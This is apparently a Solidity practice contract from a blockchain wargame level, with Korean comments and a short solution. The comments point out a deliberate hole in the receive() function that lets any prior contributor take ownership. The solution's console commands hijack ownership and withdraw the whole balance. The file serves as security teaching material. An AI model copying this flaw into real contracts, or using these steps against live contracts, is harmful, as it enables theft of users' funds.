// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Fallback {
    mapping(address => uint256) public contributions; // contribution이라는 매핑 변수 선언
    address public owner;

    constructor() {
        owner = msg.sender;
        contributions[msg.sender] = 1000 * (1 ether); //처음에 배포한 사람의 기여도를 1000 이더로 설정
    } 

    modifier onlyOwner() {
        require(msg.sender == owner, "caller is not the owner");
        _;
    } // 소유자만 접근할 수 있는 함수에 적용하는 modifier

    function contribute() public payable {
        require(msg.value < 0.001 ether); //0.001 이더보다 작은 금액만 기여 가능
        contributions[msg.sender] += msg.value; //기여도 업데이트
        if (contributions[msg.sender] > contributions[owner]) { //기여도가 소유자보다 커지면 소유자 변경
            owner = msg.sender;
        }
    }

    function getContribution() public view returns (uint256) {
        return contributions[msg.sender];
    }

    function withdraw() public onlyOwner {
        payable(owner).transfer(address(this).balance);
    } // 소유자만 출금 가능

    receive() external payable {
        require(msg.value > 0 && contributions[msg.sender] > 0);
        owner = msg.sender; //기여도가 0보다 크고 0 이더 이상을 보낸 사람을 소유자로 변경 > 이걸 이용해서 소유자 변경 가능
    }
}

//풀이
//await contract.contribute({value:1})
//Instance address 0x55ba74DB8157623abef3b85a10F347eA9a7f4718 로 이더 전송
//await contract.owner()  //내가 소유자가 되었는지 확인
//await contract.withdraw() //컨트랙트에 있는 이더를 모두 출금

//끝